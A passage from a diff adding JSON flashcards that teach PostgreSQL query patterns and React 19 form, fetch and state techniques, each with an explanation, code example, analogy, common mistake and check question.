+    "answer": "**`INSERT INTO page_views (path, views) VALUES ($1, 1) ON CONFLICT (path) DO UPDATE SET views = page_views.views + 1;`** You want the existing row's value here, so name the table (`page_views.views`). `SET views = excluded.views` would just reset it to 1. Three calls for one path gave 1, 2, 3."
+  },
+  {
+    "key": "app-sql-join-table",
+    "deck": 7004,
+    "title": "Model many-to-many with a join table",
+    "aliases": [
+      "many-to-many",
+      "junction table"
+    ],
+    "question": "A task can have many tags and a tag can be on many tasks. Why can't a tag_id column on tasks model this, and what table do you add instead?",
+    "plain": "A `tag_id` column holds one tag per task, and a comma-separated list of ids cannot be joined cleanly, indexed, or protected by foreign keys. Add a join table `task_tags(task_id, tag_id)` with one row per pairing, each column a foreign key, and a composite `PRIMARY KEY (task_id, tag_id)` so the same pair cannot be stored twice. Tagging is an INSERT into it, untagging is a DELETE, and queries JOIN through it.",
+    "example": "```sql\nCREATE TABLE task_tags (\n  task_id bigint NOT NULL REFERENCES tasks (id) ON DELETE CASCADE,\n  tag_id  bigint NOT NULL REFERENCES tags (id) ON DELETE CASCADE,\n  PRIMARY KEY (task_id, tag_id)\n);\nSELECT t.id, t.title\nFROM tasks t\nJOIN task_tags tt ON tt.task_id = t.id\nJOIN tags g ON g.id = tt.tag_id\nWHERE g.name = 'urgent';\n```\nWith tasks 1 and 3 tagged urgent, the SELECT returned exactly those two tasks. Inserting the pair (1, 10) a second time failed with a unique-constraint error.",
+    "analogy": "Think of a class sign-up sheet: students and courses are separate lists, and the sheet has one line per \"this student takes this course\". Nobody crams a list of courses into the student's own record.",
+    "mistake": "Forgetting the composite primary key (or a unique constraint) on the pair. A double-clicked \"Add tag\" then inserts the same pair twice, and every query that joins through the table shows that task twice.",
+    "check": "A user removes the 'bug' tag (id 10) from task 1 in a schema with tasks, tags, and a task_tags join table. Which SQL statement runs, and which table does it change?",
+    "answer": "**`DELETE FROM task_tags WHERE task_id = 1 AND tag_id = 10;`** Only the join table changes. The task and the tag both still exist; you removed the link between them. Deleting from `tags` instead would strip that tag from every task."
+  },
+  {
+    "key": "app-sql-on-delete",
+    "deck": 7004,
+    "title": "Choose what ON DELETE does",
+    "aliases": [
+      "foreign key actions",
+      "cascade delete"
+    ],
+    "question": "comments.post_id references posts(id) with no ON DELETE clause. In PostgreSQL, what happens when you delete a post that still has comments?",
+    "plain": "The DELETE fails with a foreign-key violation and nothing is removed. With no clause the action is `NO ACTION`, the default: if referencing rows still exist when the constraint is checked, PostgreSQL raises an error. The other choices: `CASCADE` deletes the child rows too, `SET NULL` clears the reference (the column must be nullable), and `RESTRICT` errors like NO ACTION but cannot be deferred to the end of the transaction.",
+    "example": "```sql\nCREATE TABLE sessions (\n  id bigint PRIMARY KEY,\n  user_id bigint NOT NULL REFERENCES users (id) ON DELETE CASCADE\n);\nCREATE TABLE orders (\n  id bigint PRIMARY KEY,\n  user_id bigint REFERENCES users (id) ON DELETE SET NULL,\n  total_cents integer NOT NULL\n);\nDELETE FROM users WHERE id = 1;\n-- user 1's sessions: deleted; user 1's orders: kept, user_id now NULL\n```\nChecked in SQLite with `PRAGMA foreign_keys = ON`; SQLite leaves foreign keys off unless you turn them on, while PostgreSQL always enforces them.",
+    "analogy": "Like closing a shared folder that still has files in it: you can refuse (NO ACTION or RESTRICT), shred everything inside (CASCADE), or move the files to an \"unfiled\" pile (SET NULL). You pick the rule when you create the folder, not when you delete it.",
+    "mistake": "Adding `ON DELETE CASCADE` everywhere so deletes \"just work\". Deleting one user can then silently wipe orders or invoices you were required to keep. Cascade data that only makes sense with its parent (sessions, join-table rows) and keep the default on records with their own value.",
+    "check": "Deleting a user should remove their login sessions but keep their past orders with no user attached. Which ON DELETE action goes on sessions.user_id and which on orders.user_id?",
+    "answer": "**`ON DELETE CASCADE` on `sessions.user_id` and `ON DELETE SET NULL` on `orders.user_id`.** Sessions are meaningless without the user, so they go with it. Orders must survive, so the reference is cleared, which requires `orders.user_id` to be nullable (no NOT NULL)."
+  },
+  {
+    "key": "app-sql-exists",
+    "deck": 7004,
+    "title": "Ask \"has any\" with EXISTS, not JOIN",
+    "aliases": [
+      "semi-join",
+      "WHERE EXISTS"
+    ],
+    "question": "You need the users who have placed at least one order. Why does joining users to orders list some users several times, and what query returns each user once?",
+    "plain": "A JOIN produces one output row per matching pair, so a user with three orders appears three times. You only want to know whether a match exists, so use `WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id)`: it tests each user once and never multiplies rows. `WHERE u.id IN (SELECT user_id FROM orders)` gives the same result here. Use a JOIN when you need columns from orders in the output.",
+    "example": "```sql\nSELECT u.name\nFROM users u\nWHERE EXISTS (\n  SELECT 1 FROM orders o\n  WHERE o.user_id = u.id\n)\nORDER BY u.id;\n-- Ada, Bo   (the plain JOIN gave Ada, Ada, Ada, Bo)\n```\nAda has three orders, Bo one, Cy none. `SELECT 1` is only a convention: EXISTS checks whether the subquery returns any row and ignores what it selects.",
+    "analogy": "Asking \"does this reader have any library loans?\" is a yes-or-no look at their card. A JOIN instead prints one line per loan, which is why a keen reader shows up many times.",
+    "mistake": "Patching the duplicates with `SELECT DISTINCT` after the JOIN. It works for a list of names, but it hides the intent, makes the database build the multiplied rows and then remove them, and the duplicates return as soon as you select a column that differs per order.",
+    "check": "Write a PostgreSQL query that lists the names of users who have no orders with status 'open', including users who have never ordered.",
+    "answer": "**`SELECT u.name FROM users u WHERE NOT EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id AND o.status = 'open');`** NOT EXISTS keeps each user for whom the subquery finds nothing, which includes users with no orders at all. Unlike `NOT IN`, it is not tripped up by NULLs in the subquery."
+  },
+  {
+    "key": "app-sql-cte",
+    "deck": 7004,
+    "title": "Name query steps with a CTE",
+    "aliases": [
+      "WITH clause",
+      "common table expression"
+    ],
+    "question": "What does a WITH clause (a common table expression, or CTE) let you do in a report query that would otherwise nest subqueries inside subqueries?",
+    "plain": "`WITH name AS (SELECT ...)` defines a named, temporary result that the main query can use like a table. You can build a report in readable steps: first compute each user's paid total, then join and filter that. A CTE exists only for the one statement it belongs to, and later CTEs in the same WITH can refer to earlier ones. The result is the same as the nested version; it is just easier to read and review.",
+    "example": "```sql\nWITH spend AS (\n  SELECT user_id, SUM(total_cents) AS paid_cents\n  FROM orders\n  WHERE status = 'paid'\n  GROUP BY user_id\n)\nSELECT u.name, s.paid_cents\nFROM spend s\nJOIN users u ON u.id = s.user_id\nWHERE s.paid_cents > 2000\nORDER BY s.paid_cents DESC;\n-- Ada | 7500\n```\nBo (1000 paid) and Cy (1500 paid, 9000 refunded) are filtered out because only paid orders are summed.",
+    "analogy": "Like working a calculation on scratch paper with labelled lines (\"subtotal = ...\", then \"after discount = subtotal - ...\") instead of writing one long formula full of nested brackets.",
+    "mistake": "Treating a CTE like a saved view or cache. It lives only inside its statement, so the next request computes it again. In PostgreSQL 12+ it is not automatically slower either: a simple, side-effect-free CTE can be folded into the main query and optimized with it.",
+    "check": "Write a query using WITH that lists the users whose number of orders is above the average number of orders per user.",
+    "answer": "**`WITH counts AS (SELECT user_id, COUNT(*) AS n FROM orders GROUP BY user_id) SELECT user_id, n FROM counts WHERE n > (SELECT AVG(n) FROM counts);`** The CTE is used twice, once for the rows and once for the average, so the GROUP BY is written only once."
+  },
+  {
+    "key": "app-sql-case",
+    "deck": 7004,
+    "title": "Branch inside a query with CASE",
+    "aliases": [
+      "CASE WHEN",
+      "conditional aggregation"
+    ],
+    "question": "How do you count open and done tasks per project in one SQL query, returning one row per project with a column for each count?",
+    "plain": "Put a `CASE` expression inside `SUM`: `SUM(CASE WHEN status = 'open' THEN 1 ELSE 0 END)` adds 1 for each open task in the group and 0 for the rest. A second column does the same for done, and `GROUP BY project_id` gives one row per project. `CASE WHEN ... THEN ... ELSE ... END` returns a value per row, so it also works in SELECT lists, ORDER BY, and UPDATE. PostgreSQL also has `COUNT(*) FILTER (WHERE status = 'open')` for the same count.",
+    "example": "```sql\nSELECT project_id,\n  SUM(CASE WHEN status = 'open' THEN 1 ELSE 0 END) AS open_count,\n  SUM(CASE WHEN status = 'done' THEN 1 ELSE 0 END) AS done_count\nFROM tasks\nGROUP BY project_id\nORDER BY project_id;\n-- 1 | 2 | 1\n-- 2 | 0 | 2\n```\nProject 2 shows 0 open tasks rather than NULL because every one of its rows contributes a 1 or a 0.",
+    "analogy": "Like a tally sheet with an \"open\" column and a \"done\" column: for each task you put a mark in one of them, then add up each column per project.",
+    "mistake": "Leaving out `ELSE`: a CASE with no matching branch returns NULL. When no row in a group matches, `SUM` returns NULL instead of 0, and the API sends `null` where the UI expected a number.",
+    "check": "Tasks have priority 'high', 'medium', or 'low', and ORDER BY priority sorts them high, low, medium. How do you make the query sort them high, medium, low?",
+    "answer": "**Sort by a CASE that maps each label to a rank:** `ORDER BY CASE priority WHEN 'high' THEN 1 WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END, id`. Plain ORDER BY compares the text alphabetically; the CASE turns each label into a number in business order, and `ELSE 4` puts unexpected values last."
+  },
+  {
+    "key": "app-sql-like-escape",
+    "deck": 7004,
+    "title": "Escape % and _ in a LIKE search",
+    "aliases": [
+      "LIKE wildcards",
+      "ESCAPE clause"
+    ],
+    "question": "A product search runs title LIKE '%' || $1 || '%' with the user's text as a parameter. Why does searching for '100%' also return '1000 piece puzzle'?",
+    "plain": "Parameters stop SQL injection, but LIKE still reads `%` (any run of characters) and `_` (any one character) inside the bound value as wildcards. The pattern becomes `%100%%`, which matches any title containing `100`. Escape `\\`, `%`, and `_` in the user's text with a backslash before binding it, and add `ESCAPE '\\'`. PostgreSQL already uses backslash as its default LIKE escape; writing ESCAPE makes that explicit and portable.",
+    "example": "```js\nconst escapeLike = (s) => s.replace(/[\\\\%_]/g, '\\\\$&');\nconst sql = `SELECT id, title FROM products\n  WHERE title LIKE '%' || $1 || '%' ESCAPE '\\\\'`;\nawait db.query(sql, [escapeLike('100%')]); // binds 100\\%\n```\nAgainst three titles, the unescaped term matched '100% cotton tee', '1000 piece puzzle' and 'Box of 100 pens'; the escaped term matched only '100% cotton tee'. The `'\\\\'` in the template literal reaches the database as a single backslash.",
+    "analogy": "Like a search tool where `*` means \"anything\": to find a real asterisk you have to mark that one as \"just a character\". Escaping is that mark, added for every wildcard character the user typed.",
+    "mistake": "Fixing it by building the SQL string yourself (`LIKE '%${term}%'`). That reopens SQL injection. Keep the text a bound parameter and escape only the LIKE wildcards inside it; the two measures solve different problems.",
+    "check": "A search binds the user's text 'a_b' into title LIKE '%' || $1 || '%' without escaping it. Which title matches wrongly: 'a_b cable' or 'axb adapter'?",
+    "answer": "**'axb adapter' matches wrongly; 'a_b cable' matches correctly.** Unescaped `_` means 'any single character', so `a_b` also matches `axb`. After escaping the text to `a\\_b` and adding `ESCAPE '\\'`, only 'a_b cable' matched in a test run."
+  },
+  {
+    "key": "app-sql-date-range",
+    "deck": 7004,
+    "title": "Filter dates with half-open ranges",
+    "aliases": [
+      "date range",
+      "BETWEEN"
+    ],
+    "question": "Why does created_at BETWEEN '2026-03-01' AND '2026-03-31' miss orders placed on the afternoon of March 31 when created_at is a timestamp column?",
+    "plain": "A bare date compared with a timestamp means midnight, so the upper bound is `2026-03-31 00:00:00` and anything later that day is excluded. `BETWEEN` includes both ends, which tempts people into `23:59:59` hacks that still miss fractional seconds. Use a half-open range instead: `created_at >= '2026-03-01' AND created_at < '2026-04-01'`. It includes the start, excludes the start of the next period, and adjacent months never overlap or leave gaps.",
+    "example": "```sql\nSELECT id FROM orders\nWHERE created_at >= '2026-03-01 00:00:00'\n  AND created_at <  '2026-04-01 00:00:00'\nORDER BY id;\n-- 1, 2, 3, 4   (BETWEEN ... AND '2026-03-31 00:00:00' gave 1, 2, 3)\n```\nOrder 4 at 2026-03-31 18:45 is caught only by the half-open range, and order 5 at 2026-04-01 00:00 is correctly left out.",
+    "analogy": "Like booking a meeting room from 9:00 up to, but not including, 10:00: the next booking can start at exactly 10:00 without overlapping, and no minute falls between the two.",
+    "mistake": "Wrapping the column instead: `WHERE date(created_at) = '2026-03-15'`. It returns the right rows, but applying a function to every row stops a plain index on `created_at` from being used. With PostgreSQL's `timestamptz`, a bare date bound is read in the session time zone, so set that deliberately.",
+    "check": "Write a WHERE clause that selects orders created on 2026-03-15 from a created_at timestamp column, in a form that can use an index on created_at.",
+    "answer": "**`WHERE created_at >= '2026-03-15' AND created_at < '2026-03-16'`** Start at midnight of the day and stop before midnight of the next. It catches every moment of the 15th, including 23:59:59.5, and compares the column directly, so an index on `created_at` can be used."
+  },
+  {
+    "key": "app-react-formdata-submit",
+    "deck": 7005,
+    "title": "Read a form with FormData on submit",
+    "aliases": [
+      "FormData",
+      "onSubmit",
+      "uncontrolled form"
+    ],
+    "question": "In a React create-task form, how can the submit handler read every field's value without a useState for each input?",
+    "plain": "Handle the form's `onSubmit`, call `e.preventDefault()` so the browser doesn't reload the page, then build `new FormData(e.currentTarget)`. It holds every **named** field of that form, and `form.get('title')` returns its value as a string. The inputs can stay uncontrolled (set a starting value with `defaultValue`). Keep `useState` for values the screen must react to while the user types.",
+    "example": "```jsx\nfunction NewTask({ onCreate }) {\n  function handleSubmit(e) {\n    e.preventDefault();\n    const form = new FormData(e.currentTarget);\n    onCreate({ title: form.get('title'), qty: Number(form.get('qty')) });\n  }\n  return (\n    <form onSubmit={handleSubmit}>\n      <input name=\"title\" defaultValue=\"Buy milk\" />\n      <input name=\"qty\" type=\"number\" defaultValue=\"3\" />\n      <button>Add</button>\n    </form>\n  );\n}\n```\n\nClicking Add calls `onCreate({ title: 'Buy milk', qty: 3 })`. On its own, `form.get('qty')` returns the string `'3'`, even for `type=\"number\"`, so convert it.",
+    "analogy": "It is like collecting a paper form at a counter and reading the labelled boxes once, instead of watching the person write every letter. Boxes without a label (a `name`) are never read.",
+    "mistake": "Forgetting `e.preventDefault()`. The browser then performs a normal form submission: it navigates to the form's URL with the fields in the query string, the page reloads, and all React state is lost before your fetch finishes.",
+    "check": "A signup input has `id=\"email\"` but no `name` attribute. What does `new FormData(form).get('email')` return when the form is submitted?",
+    "answer": "**`null`.** FormData collects fields by their `name`, not their `id`, so an unnamed input is skipped entirely. Add `name=\"email\"`, and keep the `id` for the `<label htmlFor=\"email\">`."
+  },
+  {
+    "key": "app-react-use-action-state",
+    "deck": 7005,
+    "title": "Track a form action with useActionState",
+    "aliases": [
+      "useActionState",
+      "form action",
+      "isPending"
+    ],
+    "question": "What do the three values returned by React 19's `useActionState(action, initialState)` give a create-task form?",
+    "plain": "`const [state, formAction, isPending] = useActionState(save, initialState)`. `state` is whatever `save` last returned (at first, `initialState`), such as `{ error: 'Title is required' }`. `formAction` goes in `<form action={formAction}>`; on submit React calls `save(previousState, formData)`. `isPending` is true while the action runs, so you can disable the button. Import it from `react`; it replaced the earlier `useFormState` from `react-dom`.",
+    "example": "```jsx\nasync function createTask(prev, formData) {\n  const title = String(formData.get('title')).trim();\n  if (!title) return { error: 'Title is required' };\n  await api.createTask({ title });\n  return { error: null };\n}\nfunction NewTask() {\n  const [state, formAction, isPending] = useActionState(createTask, { error: null });\n  return (\n    <form action={formAction}>\n      <input name=\"title\" />\n      <button disabled={isPending}>Add</button>\n      {state.error && <p role=\"alert\">{state.error}</p>}\n    </form>);\n}\n```\n\nA blank title shows \"Title is required\" without calling the API. While `api.createTask` runs, the button is disabled. When the action finishes, React resets the form's uncontrolled inputs.",
+    "analogy": "It behaves like a reducer whose steps are async and triggered by form submits: `(previousState, formData) => nextState`. React keeps the latest result for you and tells you when a step is still running.",
+    "mistake": "Throwing an error for an expected validation failure. A throw inside the action goes to the nearest error boundary, which replaces the whole form with its fallback. Return `{ error: '…' }` for problems the user can fix, and let only unexpected failures throw.",
+    "check": "An action written as `async function save(formData)` works in `<form action={save}>`. After wrapping it with `useActionState(save, null)`, `formData.get` fails. Why?",
+    "answer": "**The arguments shifted.** With `useActionState`, React calls the action as `save(previousState, formData)`, so the first parameter now receives the previous state (here `null`), which has no `get` method. Change the signature to `save(prevState, formData)`."
+  },
+  {
+    "key": "app-react-use-form-status",
+    "deck": 7005,
+    "title": "Show a pending button with useFormStatus",
+    "aliases": [
+      "useFormStatus",
+      "pending",
+      "submit button"
+    ],
+    "question": "Where must a component call `useFormStatus()` from `react-dom` for its `pending` value to follow a form's submission?",
+    "plain": "Inside a component rendered **within** the `<form>`, such as a `SubmitButton` child. `useFormStatus` reports the status of the parent form, much like reading context. Called in the component that renders the `<form>` itself, it has no parent form, so `pending` stays `false`. It tracks forms whose `action` is a function (React 19); a plain `onSubmit` handler never makes it pending.",
+    "example": "```jsx\nimport { useFormStatus } from 'react-dom';\n\nfunction SubmitButton() {\n  const { pending } = useFormStatus();\n  return <button disabled={pending}>{pending ? 'Saving…' : 'Save'}</button>;\n}\n\nfunction NoteForm({ saveNote }) {\n  return (\n    <form action={saveNote}>\n      <textarea name=\"body\" />\n      <SubmitButton />\n    </form>\n  );\n}\n```\n\nWhile `saveNote` runs, the button reads \"Saving…\" and is disabled; afterwards it returns to \"Save\". The hook also exposes `data`, the FormData being submitted.",
+    "analogy": "Treat `<form>` like a context provider for its own status. Just as `useContext` reads the nearest provider above the caller, `useFormStatus` reads the nearest form above it, never one the component renders below itself.",
+    "mistake": "Expecting `useFormStatus` to report a form that uses `onSubmit` with `e.preventDefault()` and a manual fetch. That form never starts a React action, so `pending` stays `false`; track the request with your own state or switch to a function `action`.",
+    "check": "A `NewTask` component renders `<form action={save}>` and calls `useFormStatus()` in its own body to disable the button. The button never disables. Why?",
+    "answer": "**The hook has no parent form.** `useFormStatus` only reports a `<form>` rendered above the calling component. Move the button into a `SubmitButton` component that calls the hook and render it inside the form, or use `isPending` from `useActionState`."
+  },
+  {
+    "key": "app-react-fetch-abort",
+    "deck": 7005,
+    "title": "Cancel an effect's fetch with AbortController",
+    "aliases": [
+      "AbortController",
+      "AbortError",
+      "fetch in useEffect"
+    ],
+    "question": "A task detail component fetches `/api/tasks/${id}` in `useEffect`. How should it cancel that request when `id` changes or the component unmounts?",
+    "plain": "Create an `AbortController` inside the effect, pass `controller.signal` to `fetch`, and return a cleanup that calls `controller.abort()`. React runs the cleanup before the effect runs again for a new `id`, and on unmount, so the old request stops and cannot overwrite newer state. An aborted fetch rejects with an `AbortError`, so the `catch` must skip it instead of showing an error.",
+    "example": "```jsx\nuseEffect(() => {\n  const controller = new AbortController();\n  setState({ status: 'loading' });\n  fetch(`/api/tasks/${id}`, { signal: controller.signal })\n    .then((res) => {\n      if (!res.ok) throw new Error(`HTTP ${res.status}`);\n      return res.json();\n    })\n    .then((data) => setState({ status: 'success', data }))\n    .catch((error) => {\n      if (controller.signal.aborted) return; // cancelled on purpose\n      setState({ status: 'error', error });\n    });\n  return () => controller.abort();\n}, [id]);\n```\n\nSwitching from task 1 to task 2 aborts request 1; its rejection is ignored, and only task 2 reaches state.",
+    "analogy": "Like cancelling a delivery order when you change the address: you ring the shop to cancel (abort), and the \"order cancelled\" text you then receive is expected, not a problem to report to anyone.",
+    "mistake": "Creating one `AbortController` outside the effect (in a ref or at module level) and reusing it. After the first `abort()` its signal stays aborted, so every later `fetch` with that signal rejects immediately. Make a new controller in each effect run.",
+    "check": "A task page aborts its fetch in the effect cleanup, but every switch to another task briefly shows \"Failed to load\". What is the `catch` handler missing?",
+    "answer": "**A check for the intentional abort.** The cleanup's `abort()` makes the old fetch reject with an `AbortError`, and the `catch` treats it as a failure. Return early when `controller.signal.aborted` is true (or `error.name === 'AbortError'`) before setting the error state."
+  },
+  {
+    "key": "app-react-status-union",
+    "deck": 7005,
+    "title": "Model a request as one status union",
+    "aliases": [
+      "loading state",
+      "tagged union",
+      "discriminated union"
+    ],
+    "question": "Why is one `status` state (`'loading' | 'error' | 'success'`) safer for a fetched task list than separate `isLoading`, `error`, and `tasks` states?",
+    "plain": "Three independent states allow combinations that make no sense, such as a spinner and an old error at once, and every update must remember to change all three. One state object such as `{ status: 'error', message }` can be in only one situation at a time; each render branch reads only the fields that exist for it, and TypeScript can check it as a tagged union. Each change replaces the whole object.",
+    "example": "```tsx\ntype ListState =\n  | { status: 'loading' }\n  | { status: 'error'; message: string }\n  | { status: 'success'; tasks: Task[] };\n\nfunction TaskList({ state }: { state: ListState }) {\n  if (state.status === 'loading') return <p>Loading…</p>;\n  if (state.status === 'error') return <p role=\"alert\">{state.message}</p>;\n  if (state.tasks.length === 0) return <p>No tasks yet</p>;\n  return <ul>{state.tasks.map((t) => <li key={t.id}>{t.title}</li>)}</ul>;\n}\n```\n\nAfter the two early returns TypeScript knows `state` is the success shape, so `state.tasks` compiles. Reading `state.tasks` before those checks is a type error.",
+    "analogy": "A traffic light lights one lamp at a time. Three separate bulbs wired to three separate switches could show red and green together, and drivers would not know what to do.",
+    "mistake": "Keeping the three states but forgetting one on a transition, for example starting a retry with `setIsLoading(true)` and never calling `setError(null)`. The old error then outlives the retry. With one status object, setting `{ status: 'loading' }` removes the error automatically.",
+    "check": "A task list has `isLoading`, `error`, and `tasks` states and renders the error first when it is set. A retry succeeds and sets `tasks`, but nobody clears `error`. What does the user see?",
+    "answer": "**The old error message, not the fresh tasks.** The stale `error` is still set, and the component checks it before `tasks`. Clear it in the retry, or better, store one state: `setState({ status: 'success', tasks })` replaces the error because the object has no `error` field."
+  },
+  {
+    "key": "app-react-append-created",
+    "deck": 7005,
+    "title": "Add the created item from the response",
+    "aliases": [
+      "update list after create",
+      "functional update"
+    ],
+    "question": "After `POST /api/tasks` succeeds, how should a React list add the new task without refetching the whole list?",
+    "plain": "Append the object the server returns, which carries the real `id` and server-set fields such as `createdAt`, not the form values. Use an updater function: `setTasks((prev) => [...prev, created])`. The updater receives the latest list, even if other saves finished while this request was in flight. Refetching is still the simpler choice when the server sorts, filters, or paginates the list.",
+    "example": "```jsx\nasync function addTask(title) {\n  const res = await fetch('/api/tasks', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ title }),\n  });\n  if (!res.ok) throw new Error(`HTTP ${res.status}`);\n  const created = await res.json(); // { id: 44, title: 'A', createdAt: '…' }\n  setTasks((prev) => [...prev, created]);\n}\n```\n\nTwo quick adds that finish out of order both end up in the list, each with the id the server issued.",
+    "analogy": "Like adding to a shared shopping list: write the new line on whatever the list says now, not on a photo of the list you took before walking to the shop.",
+    "mistake": "Appending the form values with a made-up id such as `Date.now()`. The row looks right, but the next edit or delete sends an id the server never issued and gets a 404.",
+    "check": "Two create requests are in flight, and each finishes with `setTasks([...tasks, created])`. Both succeed, yet only the second new task appears. Why?",
+    "answer": "**Each handler captured `tasks` from the render where it started.** Both spread the same old array, so the second update replaces the first. Use `setTasks((prev) => [...prev, created])` so each append builds on the latest list."
+  },
+  {
+    "key": "app-react-use-optimistic",
+    "deck": 7005,
+    "title": "Optimistic updates with useOptimistic",
+    "aliases": [
+      "useOptimistic",
+      "optimistic UI",
+      "rollback"
+    ],
+    "question": "How does React 19's `useOptimistic` show a new task immediately and remove it again if the save fails?",
+    "plain": "`useOptimistic(tasks, (current, newTask) => [...current, newTask])` returns a list to render plus a setter. Call the setter inside an action or `startTransition`; React shows the temporary list while that action runs. When the action ends, React drops the optimistic value and renders the real `tasks` again. If the save failed, you never updated `tasks`, so the temporary item disappears: that is the rollback.",
+    "example": "```jsx\nfunction TaskList({ tasks, setTasks }) {\n  const [shown, addOptimistic] = useOptimistic(tasks, (cur, t) => [...cur, t]);\n  async function add(formData) {\n    const title = formData.get('title');\n    addOptimistic({ id: `temp-${Date.now()}`, title, sending: true });\n    try {\n      const created = await api.createTask(title);\n      startTransition(() => setTasks((prev) => [...prev, created]));\n    } catch { showToast('Could not save'); }\n  }\n  return (<form action={add}>\n    <input name=\"title\" /><button>Add</button>\n    <ul>{shown.map((t) => <li key={t.id}>{t.title}{t.sending && ' …'}</li>)}</ul>\n  </form>);\n}\n```\n\nWhile saving, the list shows \"New …\". On success it shows the saved task; on failure it returns to the old list and a toast appears.",
+    "analogy": "Like pencilling a booking into a diary: it is visible at once. When the confirmation arrives you ink it in (update the real state); if it never comes, the pencil mark is erased for you.",
+    "mistake": "Calling the optimistic setter in a plain `onClick`, outside any action or transition. React logs \"An optimistic state update occurred outside a transition or action\", and the temporary value only flashes instead of lasting until the save finishes.",
+    "check": "A like button uses `useOptimistic(liked)` and shows \"Liked\" instantly. The request fails and the catch only logs the error. What does the button show once the action ends?",
+    "answer": "**The real, unliked state.** The optimistic value lasts only while the action runs. The failed save never updated `liked`, so React falls back to it without any rollback code. Still tell the user the like was not saved."
+  },
+  {
+    "key": "app-react-router-params",
+    "deck": 7005,
+    "title": "Route params arrive as strings",
+    "aliases": [
+      "useParams",
+      "React Router",
+      "useSearchParams"
+    ],
+    "question": "In React Router, what type does `useParams()` return for `taskId` on the route `/tasks/:taskId`, and why does that matter when looking up the task?",
+    "plain": "A string (or `undefined` if that segment isn't part of the matched route). Visiting `/tasks/7` gives `'7'`, so `tasks.find((t) => t.id === taskId)` never matches numeric ids. Convert once where you read it, with `Number(taskId)`, and render a not-found state for `NaN` or a missing task. Query values are strings too: `useSearchParams()` gives a `URLSearchParams` whose `get('page')` returns a string or `null`.",
+    "example": "```jsx\nimport { useParams } from 'react-router';\n\nfunction TaskPage({ tasks }) {\n  const { taskId } = useParams(); // '7' for /tasks/7\n  const task = tasks.find((t) => t.id === Number(taskId));\n  if (!task) return <p>Task not found</p>;\n  return <h1>{task.title}</h1>;\n}\n```\n\nWith `t.id === taskId` the lookup returns `undefined` for `/tasks/7`; with `Number(taskId)` it finds the task. In React Router 7 the hooks are imported from `react-router`.",
+    "analogy": "A URL is text, like an address written on an envelope. The \"7\" on the envelope is a character until you read it as the number 7.",
+    "mistake": "Converting with `parseInt(taskId)` and trusting the result. `parseInt('7abc')` is `7`, so `/tasks/7abc` quietly shows task 7. `Number('7abc')` is `NaN`, which fails the lookup and shows not-found.",
+    "check": "A task list reads `const [params] = useSearchParams()` and builds its Next link from `params.get('page') + 1`. On `/tasks?page=2`, what page does Next point to?",
+    "answer": "**Page 21.** `get('page')` returns the string `'2'`, and `'2' + 1` concatenates to `'21'`. Convert first: `Number(params.get('page') ?? 1) + 1` gives 3, and the `?? 1` covers a missing `page`, for which `get` returns `null`."
+  },
+  {
+    "key": "app-react-strict-mode-effects",
+    "deck": 7005,
+    "title": "StrictMode runs effects twice in development",
+    "aliases": [
+      "StrictMode",
+      "double fetch",
+      "effect runs twice"
+    ],
+    "question": "Why does a component's `useEffect` fetch appear twice in the Network panel during `npm run dev` but only once in the production build?",
+    "plain": "In development, `<StrictMode>` mounts each component, runs its effects, runs their cleanups, and then runs the effects again. This stress test exposes effects that are missing cleanup. Production builds run the effect once. Keep StrictMode on and make the effect safe to repeat: abort or ignore the first request in cleanup. A duplicate GET is harmless; a duplicate write means the code belongs in an event handler.",
+    "example": "```jsx\nuseEffect(() => {\n  let ignore = false;\n  fetch(`/api/tasks/${id}`)\n    .then((res) => res.json())\n    .then((task) => { if (!ignore) setTask(task); });\n  return () => { ignore = true; };\n}, [id]);\n```\n\nIn development under StrictMode this effect runs twice; the first run's cleanup sets `ignore`, so only the second response is stored. In a production build it runs once.",
+    "analogy": "Like a fire drill: the building is emptied and re-entered once on purpose, so a door that doesn't open is found before a real emergency. Here the real emergency is leaving the screen or changing `id`.",
+    "mistake": "Adding a `useRef` flag so the effect body runs only the first time. That hides the double request in development, but it adds no cleanup, and a flag that is never reset also stops the effect from refetching when `id` changes. Make the effect safe to run twice instead.",
+    "check": "A chat screen's effect calls `connection.connect()` and returns nothing. In development StrictMode leaves two open connections. What change fixes it in both development and production?",
+    "answer": "**Return a cleanup that disconnects:** `return () => connection.disconnect();`. StrictMode's mount, cleanup, mount then ends with one open connection, and in production the same cleanup closes it when the screen unmounts or the room changes."
+  },
+  {
+    "key": "app-react-key-reset",
+    "deck": 7005,
+    "title": "Reset a form's state with a key",
+    "aliases": [
+      "key prop",
+      "reset state",
+      "remount"
+    ],
+    "question": "How can a React edit form throw away its draft state when the user switches from editing one record to another?",
+    "plain": "Give the form a `key` tied to the record: `<EditTask key={task.id} task={task} />`. When the key changes, React treats it as a different component: it unmounts the old one, dropping its state and running effect cleanups, and mounts a fresh one, so `useState(task.title)` starts again from the new task. Without the key, React reuses the same instance and `useState` ignores its new initial value.",
+    "example": "```jsx\nfunction EditTask({ task }) {\n  const [title, setTitle] = useState(task.title);\n  return <input value={title} onChange={(e) => setTitle(e.target.value)} />;\n}\n\n// In the page that switches between tasks:\n<EditTask key={task.id} task={task} />\n```\n\nRender task A and then task B: without `key` the input still shows \"Task A\"; with `key={task.id}` it shows \"Task B\".",
+    "analogy": "A key works like the name on a hotel booking. The same name keeps the room and whatever is in it; a new name gets the room cleared and set up fresh.",
+    "mistake": "Copying the prop into state with `useEffect(() => setTitle(task.title), [task])`. It renders the old title first and then renders again, and it wipes the user's draft whenever a background refetch passes a new task object with the same id.",
+    "check": "A post page renders `<CommentBox postId={post.id} />`, which keeps the draft in `useState`. After Next post, the half-typed comment from the previous post is still in the box. What one change clears it?",
+    "answer": "**Add a key:** `<CommentBox key={post.id} postId={post.id} />`. A new key makes React mount a fresh `CommentBox` for each post, so its draft state starts empty."
+  },
+  {
+    "key": "app-vitest-tobe-toequal",
+    "deck": 7006,
+    "title": "Compare objects with toEqual, not toBe",
+    "aliases": [
+      "toStrictEqual",
+      "deep equality"
+    ],
+    "question": "In Vitest, why does expect(createTask('Buy milk')).toBe({ title: 'Buy milk', done: false }) fail even though every field matches?",
